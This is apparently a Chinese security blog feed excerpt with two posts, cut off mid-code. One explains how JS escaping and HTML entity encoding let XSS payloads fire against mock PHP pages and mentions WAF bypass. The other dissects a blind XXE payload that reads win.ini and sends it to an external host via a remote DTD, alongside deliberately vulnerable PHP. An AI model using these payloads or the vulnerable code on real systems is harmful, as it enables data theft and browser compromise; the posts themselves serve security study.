        <content type="html"><![CDATA[<p>今天在给客户做渗透测试时，遇到了一处XSS。虽然很简单，但有点小意思。引发了我对js转义和html转义在XSS中的思考，故做个小笔记记录一下。两个例子都会以仿写现实场景的代码的说明问题。</p><h2 id="0x01-一点知识贮备"><a href="#0x01-一点知识贮备" class="headerlink" title="0x01 一点知识贮备"></a>0x01 一点知识贮备</h2><h4 id="1-1-关于转义"><a href="#1-1-关于转义" class="headerlink" title="1.1 关于转义"></a>1.1 关于转义</h4><p><code>&amp;#**;</code>格式的字符串是html的转义字符,<code>\</code>是JS的转义符,转义的目的就是告诉解析器该符号为字符，而不是代码，防止代码出现歧义。</p><h4 id="1-2-浏览器解析原则"><a href="#1-2-浏览器解析原则" class="headerlink" title="1.2 浏览器解析原则"></a>1.2 浏览器解析原则</h4><ol><li>若果存在html转义字符串，HTML解析引擎会先把转义字符解析为字符串</li><li>HTML解析引擎按照从上到下，从外向里解析html标签</li><li>遇到html标签浏览器会让html解析引擎解析，遇到<code>&lt;script&gt;</code>标签，浏览器会让JS解析引擎对标签内容进行解析。</li></ol><h4 id="1-3-html源码和浏览器解析结果"><a href="#1-3-html源码和浏览器解析结果" class="headerlink" title="1.3 html源码和浏览器解析结果"></a>1.3 html源码和浏览器解析结果</h4><p>在浏览器中我们按住快捷键ctrl+u，看到的是服务器接受我们的请求后返回的html源码。按F12进入开发者工具面板，开发者工具分析出的DOM结构，就是浏览器的解析结果。</p><p>ps：html源代码DOM结构和浏览器解析后的DOM结构是有区别的！</p><h2 id="0x02-XSS与JS转义"><a href="#0x02-XSS与JS转义" class="headerlink" title="0x02 XSS与JS转义"></a>0x02 XSS与JS转义</h2><h4 id="2-1-测试代码和问题描述"><a href="#2-1-测试代码和问题描述" class="headerlink" title="2.1 测试代码和问题描述"></a>2.1 测试代码和问题描述</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;一个XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> input_str = <span class="string">"&lt;?php echo $_POST['str']?&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(input_str.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">document.write(<span class="string">"Your input:"</span>+input_str);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"str"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当我们提交<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>,前端没有出现我们期待的弹窗，而是输出了以下字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;; if(input_str.length&gt;0)&#123; document.write(&quot;Your input:&quot;+input_str); &#125;</span><br></pre></td></tr></table></figure><p>而当我们提交<code>&lt;script&gt;alert(1);&lt;\/script&gt;</code>,则可以正常弹框。如何解释这两种情况，我们来思考一下？</p><h4 id="2-2-原理分析"><a href="#2-2-原理分析" class="headerlink" title="2.2 原理分析"></a>2.2 原理分析</h4><p>当我们输入第一个payload提交后，得到的html源码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>一个XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="xml">var input_str = "<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>";</span><br><span class="line">if(input_str.length&gt;0)&#123;</span><br><span class="line">document.write("Your input:"+input_str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"str"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当我们的HTML解析器解析到<code>&lt;script&gt;</code>标签时，它会快速去查找离它最近的闭合标签<code>&lt;/script&gt;</code>。这时它查找到是8行中的<code>&lt;/script&gt;</code>,而不是12行的<code>&lt;/script&gt;</code>。这时<code>&lt;script&gt;</code>标签内的<code>var input_str = &quot;&lt;script&gt;alert(1);</code>被交给js引擎去解析。而8行<code>&lt;/script&gt;</code>和12行的<code>&lt;/script&gt;</code>之间的代码被当成字符串输出到前端页面。而由于6行<code>&lt;/script&gt;</code>标签没有配对成功，故不会被浏览器解析为一个合法标签。 <strong>所以最终的解析结果是第8行的<code>&lt;script&gt;</code>被解析为字符串，<code>&lt;/script&gt;</code>被解析为html标签。</strong></p><p>当我们输入第二个payload提交后，得到的html源码如下，与上面代码类似，只是差异只在第8行（多了一个/）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS与JS编码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="xml">var input_str = "<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>);<span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span></span><span class="string">";</span></span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(input_str.length&gt;<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"Your input:"</span>+input_str);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"str"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还是同样的解析原则，html解析引擎解析到7行的<code>&lt;script&gt;</code>时，它会快速去查找离它最近的闭合标签<code>&lt;/script&gt;</code>。这是在到第8行时发现<code>&lt;\/script&gt;</code>标签，而不是<code>&lt;/script&gt;</code>,<br>故继续往下，直到找寻到12行的<code>&lt;/script&gt;</code>标签，才完成了配对。这时8行和11行的代码交给了js引起去解析。由于<code>&lt;script&gt;alert(1);&lt;\/script&gt;</code>双引号包围，所以js解析器会把它当字符串处理。 <strong>所以最终的解析结果是第8行中的<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>都是字符串而不是标签。</strong></p><p>值得注意的是第8行当中的\字符的引入使得<code>&lt;script&gt;</code>标签在html解析引擎解析时未在第8行被闭合,同时又因为\为js语法中的转义字符，故在js解析引擎解析时，又能正常解析input_str变量的值为<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>字符串，所以最总成功弹窗，很巧妙！</p><p>这些解析结果都是可以使用浏览器自带的F12开发者工具开验证。</p><h2 id="0x03-XSS与html转义"><a href="#0x03-XSS与html转义" class="headerlink" title="0x03 XSS与html转义"></a>0x03 XSS与html转义</h2><h4 id="3-1-测试代码与问题描述"><a href="#3-1-测试代码与问题描述" class="headerlink" title="3.1 测试代码与问题描述"></a>3.1 测试代码与问题描述</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;XSS与html编码&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$_POST[<span class="string">'str1'</span>].<span class="string">"'&gt;str1&lt;/a&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"str2:"</span>.$_POST[<span class="string">'str2'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">str1:&lt;input type=<span class="string">"text"</span> name=<span class="string">"str1"</span> /&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">str2:&lt;input type=<span class="string">"text"</span> name=<span class="string">"str2"</span> /&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们将<code>javascript:alert(1);</code>html转义得到如下字符串，并填写到str1输入框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3b;</span><br></pre></td></tr></table></figure><p>我们将<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>html转义后得到如下字符，并填写到str2输入框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;</span><br></pre></td></tr></table></figure><p>提交后发现点击str1链接可以弹框，说明前者被当代码来执行了，而后者被当字符串输出了。我们来看这时为何？</p><h4 id="3-2-原理分析"><a href="#3-2-原理分析" class="headerlink" title="3.2 原理分析"></a>3.2 原理分析</h4><p>提交payload之后，服务器返回的html代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS与编码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3b;'</span>&gt;</span>str1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span>str2:&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">str1:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"str1"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">str2:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"str2"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而浏览器html解析器解析后的结果如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS与编码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'javascript:alert(1);'</span>&gt;</span>str2:&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">str1:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"str1"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">str2:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"str2"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过解析结果，我们可以很容易看到。payload其实都被当成了字符输出了。只是在点击str1连接时，前者被解码之后的字符被当代码执行了。而后者被浏览器html解析器解码后为<code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;</code>,而不是<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>,所以js代码自然无法执行。所以str2应该为<code>&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3b;&lt;/script&gt;</code>,才可以触发XSS。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>通过对js转义和html转义在XSS中的应用，让我对浏览器解析html代码的解析过程有了更深的了解。可以借鉴其中的原理来构造更简洁，精巧的XSS的payload，也可以尝试用来绕waf。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/hxsstar/article/details/21519301" target="_blank" rel="noopener">XSS绕过学习</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞艺术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blind XXE经典payload引发的脑洞</title>
      <link href="/articles/2018/think-about-blind-xxe-payload/"/>
      <url>/articles/2018/think-about-blind-xxe-payload/</url>
      
        <content type="html"><![CDATA[<p>payload1是xxe一个经典payload。一般用于无回显的<code>blind xxe</code>。但是问题来了，为何Payload作者将payload内容分两部分（比如像payload1这样），而不是将所有攻击实体放到一个payload中（比如像payload2这样）。注意：Blind XXE是没有回显的，为了测试方便，我将payload有回显的显示了。</p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line">print_r($creds);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://www.site.com/evilt.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="evilt-dtd"><a href="#evilt-dtd" class="headerlink" title="evilt.dtd"></a>evilt.dtd</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://www.site.com/?%file;'&gt;"&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini"&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://www.site.com/?%file;'&gt;"&gt;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure><p>钻这个牛角尖的意义：</p><ul><li>如果没有公网空间payload1将无法使用，而payload2可行的话就可以解决payload1的缺陷。</li><li>payload1的作者为何把payload分两部分构造为payload1,而不是分一部分构造成功payload2。</li><li>更深入的了解xxe payload的构造。</li></ul><p>我在payload1能执行成功的情况下，有测试了payload2。结果令人失望，没有成功。难道原因是payload作者也想把所有攻击内容放在一个payload只是这样无法执行成功？网上看了一下全是清一色的经典payload的样式。看来只有我来自己构造一个能实现payload1功能,同时包含所有攻击代码的payload了。</p><h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><p>第一个想是通过查看错误信息来找原因。</p><p><img src="/articles/2018/think-about-blind-xxe-payload/my_payload_1.png" alt></p><p>报错<code>PEReferences forbidden in internal subset in Entity</code></p><p>根据报错，我将<code>http://127.0.0.1/?%file;</code>中的%编码为&#25;</p><p><img src="/articles/2018/think-about-blind-xxe-payload/my_payload_2.png" alt></p><p>还是报错<code>Invalid URI: http://127.0.0.1/?&amp;#x25; in Entity</code>,说明<code>&amp;#x25;file</code>只是变成了%file，但是%file没有解析为实体file的值。</p><p>我又将第二个实体中的SYSTEM去掉，也就是第二个实体我声明为内部实体，结果<code>&amp;#x25;file</code>成功解析为实体file内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send &apos;http://127.0.0.1/?&amp;#x25;file;&apos;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;send;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/think-about-blind-xxe-payload/payload_2_x25.png" alt></p><p>这令我很是不解，为何内部声明&#x25;file能够成功解析，为何外部声明时不行？我暂时理解为，外部声明需要多一个步骤URL合法性检验。说明在%file还没有被解析为file实体值时，URL合法性检验就开始了。而是在HTTP协议中%与url编码中的%有冲突了。</p><p>然而一切都是我的猜想而已。想了一下，xml解析器是在php内部，无法知道它解析一个xml的具体细节。除非我可以调式源代码（目前没有这能力。），那下面我只能看看，有没有权威的文档去解释这个问题了。</p><h2 id="权威文档"><a href="#权威文档" class="headerlink" title="权威文档"></a>权威文档</h2><p>《XML Schema,DTD,and Entity Attacks》一文中有关XXE和参数实体的部分。</p><p><img src="/articles/2018/think-about-blind-xxe-payload/english_article.png" alt="英文资料"></p><p>书到用时方恨少，读然好想写英语。这次只能借助百度翻译和有道翻译了。下面是针对于英文材料翻译和我的一些理解。</p><p>参数实体是一种特殊类型的实体，它只能在DTD定义本身中使用。这些实体与文档实体的定义基本相同，但它们的行为更像(但不完全像)代码宏，并允许使用它们。<br>更灵活的DTD定义。考虑以下内容，其中的an-element被定义为一个常规参数实体，<br>远程dtd被定义为一个外部参数实体:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%an-element;</span><br><span 